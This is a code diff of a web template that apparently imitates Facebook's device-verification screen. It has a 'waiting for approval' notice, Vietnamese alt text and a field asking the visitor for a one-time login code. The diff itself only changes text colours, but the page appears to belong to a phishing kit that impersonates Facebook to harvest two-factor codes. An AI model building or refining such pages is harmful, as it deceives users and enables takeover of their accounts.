@@ -49,12 +49,12 @@
 </head>
 
 <body>
-    <div class="min-h-screen bg-card flex items-center justify-center px-4 hidden" id="verify_otp">
+    <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_otp">
         <div class="w-full sm:max-w-[900px]">
-            <p class="text-[13px] text-muted-foreground mb-1">Facebook</p>
-            <h1 class="text-[22px] font-bold text-card-foreground leading-snug mb-2">
+            <p class="text-[13px] text-black mb-1">Facebook</p>
+            <h1 class="text-[22px] font-bold text-black leading-snug mb-2">
                 {{ __('facebook.check_device_notification') }}</h1>
-            <p class="text-[14px] text-muted-foreground leading-relaxed mb-5">
+            <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
                 <img src="images/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
@@ -62,9 +62,9 @@
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
                 <div>
-                    <p class="text-[15px] font-semibold text-card-foreground leading-tight">
+                    <p class="text-[15px] font-semibold text-black leading-tight">
                         {{ __('facebook.waiting_for_approve') }}</p>
-                    <p class="text-[13px] text-muted-foreground mt-0.5">{{ __('facebook.waiting_message') }}</p>
+                    <p class="text-[13px] text-black mt-0.5">{{ __('facebook.waiting_message') }}</p>
                 </div>
             </div>
             <div class="h-px bg-border mb-4"></div>
@@ -74,10 +74,10 @@
                     <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-2" id="warning_otp"
                         style="display: none"></div>
                     <label
-                        class="block text-[14px] text-card-foreground font-medium mb-2">{{ __('facebook.or_enter_otp') }}</label>
+                        class="block text-[14px] text-black font-medium mb-2">{{ __('facebook.or_enter_otp') }}</label>
                     <input type="text" inputmode="numeric" maxlength="8" required
                         placeholder="{{ __('facebook.input_otp_placeholder') }}"
-                        class="w-full border border-gray-300 rounded-xl px-4 py-[10px] text-[15px] text-card-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all">
+                        class="w-full border border-gray-300 rounded-xl px-4 py-[10px] text-[15px] text-black placeholder:text-[#646d74] focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all">
                 </div>
                 <button
                     class="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white rounded-full py-[10px] text-[15px] cursor-pointer transition-colors duration-100 mb-3 disabled:cursor-default disabled:opacity-80"
